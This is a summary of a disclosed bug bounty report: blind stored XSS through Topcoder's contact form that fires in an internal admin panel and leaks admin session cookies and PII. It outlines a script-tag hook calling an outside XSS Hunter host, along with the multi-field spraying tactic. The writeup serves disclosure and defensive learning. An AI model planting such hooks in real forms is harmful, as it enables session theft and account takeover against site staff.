# Topcoder: blind stored XSS via contact form, fires in admin panel, session token and PII leak

- **Vuln type / sub-variant:** Blind stored XSS with out-of-band exfiltration. Attacker-controlled contact-form fields are stored and rendered unescaped in a back-office admin panel; execution is detected via an XSS Hunter callback.
- **Target type:** Public contact/support form (www.topcoder.com/contact-us) rendered into an internal admin/CRM panel (a Visualforce/Salesforce-backed admin view).
- **Recon signal:** The public contact form did not sanitize input and accepted angle brackets in the First name, Last name, Company, and description fields. Blind-XSS instinct: form submissions are read later by staff in an admin tool, so a payload with an out-of-band callback can reveal an otherwise invisible sink.
- **Root cause:** Contact-form field values are stored and later written into the admin-panel HTML without encoding or tag stripping. Unescaped sink: stored form field to HTML body in the admin view. Failed defenses: input sanitization on submission and output encoding in the admin panel; the admin session cookie was also exposed to script (no effective HttpOnly protection for what the callback captured).
- **Exploitation steps:**
  1. Submit the contact form with a blind-XSS payload (an `"><script src=...xss.ht></script>` style hook) placed in multiple fields to maximize the chance one reaches an unescaped sink.
  2. Wait for a staff member to open the submission in the admin panel.
  3. The hook fires in the admin's browser and the XSS Hunter service reports the event with a DOM snapshot, screenshot, IP, and captured data.
- **Bypasses used:** None specific; the form simply allowed raw HTML. Multi-field spraying used to find which field hit the admin-panel sink.
- **Impact:** Leak of the administrator's session cookies, IP address, backend application/service details, and internal PII (MailChimp customer titles, internal subscription emails). Stolen admin session cookies usable to access the admin panel (admin account takeover).
- **Bounty:** Not stated.
- **Lesson / pattern:** Any public free-text form whose entries are read by staff is a blind-stored-XSS candidate; a single OOB hook in name/company/description fields can fire deep inside an internal admin tool and leak session and PII. Encode on output in back-office views, not just public ones.
- **Source:**
  - Title: Blind stored XSS due to insecure contact form at topcoder.com leads to leakage of session token and other PII
  - Author: mase289
  - URL: https://hackerone.com/reports/878145
  - Date: 2020-08-07 (disclosed)
  - Disclosed report: https://hackerone.com/reports/878145
  - Raw file: `sources/xss/05-topcoder-blind-stored-xss-contact-form.md`

Tags: stored, blind, admin-fire, session-theft, account-takeover
